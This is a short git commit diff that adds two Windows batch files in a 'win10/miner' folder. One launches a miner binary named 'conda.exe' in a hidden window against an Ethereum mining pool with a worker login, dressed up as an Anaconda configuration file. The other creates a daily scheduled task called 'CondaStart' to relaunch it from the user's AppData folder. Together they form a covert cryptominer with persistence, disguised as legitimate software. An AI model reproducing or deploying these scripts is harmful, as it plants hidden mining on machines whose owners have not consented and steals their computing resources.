eb21b8a4156faca5c0fe79e75d9ddc0b1311948c
Tired Sosha <42004251+tiredsosha@users.noreply.github.com>
2021-09-28 23:54:46 +0300

    k

---
+++ win10/miner/AnacondaConfig.bat
@@ -0,0 +1,1 @@
+nircmd exec hide conda.exe -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u kefurtest.001 -p 123456
---
+++ win10/miner/autorestart_service.bat
@@ -0,0 +1,1 @@
+SCHTASKS/Create /SC DAILY /TN CondaStart /ST 01:00 /TR C:\Users\hc\AppData\Roaming\Conda\anaconda\AnacondaConfig.bat
